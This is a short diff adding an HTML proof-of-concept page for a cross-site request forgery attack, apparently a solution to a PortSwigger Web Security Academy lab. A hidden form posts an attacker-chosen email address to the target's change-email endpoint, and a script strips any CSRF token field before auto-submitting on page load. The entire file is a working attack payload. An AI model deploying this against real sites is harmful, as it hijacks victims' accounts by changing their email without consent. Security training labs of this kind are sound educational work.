@@ -1,0 +1,12 @@
+<form method="POST" action="https://0a68001603ddfa0f808dfd6d00b200f8.web-security-academy.net/my-account/change-email">
+  <input type="hidden" name="email" value="nguyendh1@gmail.com">
+</form>
+
+<script>
+  var form = document.forms[0];
+  var csrfInput = form.querySelector('input[name="csrf"]');
+  if (csrfInput) {
+    csrfInput.remove();
+  }
+  form.submit();
+</script>
